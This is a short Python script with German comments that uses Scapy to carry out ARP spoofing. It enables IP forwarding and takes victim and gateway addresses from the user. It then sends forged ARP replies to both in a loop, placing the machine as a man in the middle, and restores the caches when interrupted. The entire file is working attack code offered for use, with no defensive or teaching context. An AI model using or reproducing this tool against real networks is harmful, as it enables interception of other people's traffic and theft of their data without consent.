#ARP-Spoofing mit main Funktion ohne OS

from scapy.all import *
import time

def enable_ip_forward():
    ipForwardFile = "/proc/sys/net/ipv4/ip_forward"
    file = open(f"{ipForwardFile}", "w")
    file.write("1")
    file = open(f"{ipForwardFile}", "r")
    for line in file:
        line = line.strip()
        print(f"IP-Forwarding auf {line} gesetzt!")
    file.close()

def disable_ip_forward():
    ipForwardFile = "/proc/sys/net/ipv4/ip_forward"
    file = open(f"{ipForwardFile}", "w")
    file.write("0")
    file = open(f"{ipForwardFile}", "r")
    for line in file:
        line = line.strip()
        print(f"IP-Forwarding auf {line} gesetzt!")
    file.close()

def get_mac(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(victim_ip, gateway_ip):
    victim_mac = get_mac(victim_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, op="is-at")
    send(arp_response, verbose=0)
    attacker_mac = ARP().hwsrc
    print(f"Send to {victim_ip} : {gateway_ip} is-at {attacker_mac}")

def restore(victim_ip, gateway_ip):
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(arp_response, count=7, verbose=0)
    time.sleep(1)
    print(" [+] Sent to {} : {} is-at {}".format(victim_ip, gateway_ip, gateway_mac))

if __name__ == "__main__":
    enable_ip_forward()
    victim = input("Victim/Target IP-Adresse eingeben: ")
    gateway = input("Gateway IP-Adresse eingeben: ")
    try:
        while True:
            spoof(victim, gateway)
            spoof(gateway, victim)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*** Detect CRTL-c ! Restoring the Network ....]")
        restore(victim, gateway)
        restore(gateway, victim)
    disable_ip_forward()